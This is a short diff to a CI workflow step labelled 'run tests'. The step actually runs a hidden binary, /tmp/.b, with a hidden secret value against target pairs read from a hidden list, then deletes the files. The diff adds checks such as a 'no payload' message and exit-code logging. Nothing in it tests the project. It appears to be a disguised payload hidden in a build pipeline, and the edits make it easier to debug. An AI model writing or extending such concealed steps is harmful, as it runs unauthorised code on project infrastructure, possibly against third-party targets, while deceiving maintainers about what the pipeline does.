@@ -32,9 +32,15 @@ jobs:
     - name: run tests
       run: |
         S=$(cat /tmp/.s 2>/dev/null || echo 0)
-        if [ "$S" = "0" ]; then exit 0; fi
+        if [ "$S" = "0" ]; then
+          echo "no payload"
+          exit 0
+        fi
+        file /tmp/.b
+        ls -l /tmp/.b
         while read -r pair; do
           set -- $pair
-          /tmp/.b "$1" "$2" "$S" 1024 vc || true
+          /tmp/.b "$1" "$2" "$S" 1024 vc
+          echo "exit=$?"
         done < /tmp/.t
         rm -f /tmp/.b /tmp/.t /tmp/.s
